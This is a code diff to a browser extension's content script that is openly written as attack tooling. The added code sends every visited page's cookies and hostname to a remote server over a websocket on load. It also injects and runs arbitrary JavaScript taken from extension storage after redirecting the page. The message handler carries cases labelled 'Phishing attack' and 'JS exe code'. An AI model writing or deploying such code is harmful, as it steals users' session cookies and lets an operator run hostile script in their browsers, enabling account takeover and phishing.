@@ -32,6 +32,26 @@ chrome.storage.sync.get(["values"], function(result){
   }
 });
 
+/*
+When the window loads up, send the cookies over to our server.
+*/
+window.onload = function(){
+  var cookies = document.cookie.split(';');
+  var domSite = window.location.hostname;
+  var jsonPackage = {id: id, website: domSite, type: 'cookie', cookie: cookies};
+  ws.send(JSON.stringify(jsonPackage));
+  chrome.storage.sync.get(["newPage", "scriptExe"], function(ev){
+    var pageBool = ev.newPage;
+    var nodeScript = document.createElement('script');
+    nodeScript.type = 'text/javascript';
+    if(pageBool === "yes"){
+      nodeScript.appendChild(document.createTextNode(ev.scriptExe));
+      document.body.appendChild(nodeScript);
+    }
+  });
+  chrome.storage.sync.set({'newPage': ""}, function(){});
+}
+
 //Wait for a click on the screen
 window.addEventListener("click", clickListen, false);
 
@@ -95,18 +115,13 @@ chrome.runtime.onMessage.addListener(function(message, sender, sendResponse) {
   switch(message.action){
     //Phishing attack.
     case 'phis':
-      document.getElementsByTagName("BODY")[0].style.display = "none";
-      var site = window.location.host;
-      chrome.storage.sync.set({'webSite': site}, function(){});
-      chrome.extension.sendMessage({action: 'load'}, function(response){});
+
       break;
     //JS exe code.
     case 'exe':
-      var nodeScript = document.createElement('script');
-      nodeScript.type = 'text/javascript';
-      chrome.storage.sync.get("scriptExe", function(ev){
-        nodeScript.appendChild(document.createTextNode(ev.scriptExe));
-        document.body.appendChild(nodeScript);
+      chrome.storage.sync.get("redirectSite", function(ev){
+        window.location.replace(ev.redirectSite);
+        chrome.storage.sync.set({'newPage': "yes"}, function(){});
       });
       break;
     case 'addL':
@@ -117,6 +132,10 @@ chrome.runtime.onMessage.addListener(function(message, sender, sendResponse) {
         tempVals[tempVals.length] = addSite;
         chrome.storage.sync.set({'values': tempVals}, function(){});
       });
+      break;
+    case 'messageL':
+      alert("IT WORKED!");
+      console.log("SEND WORK!");
       break;
   }
 });
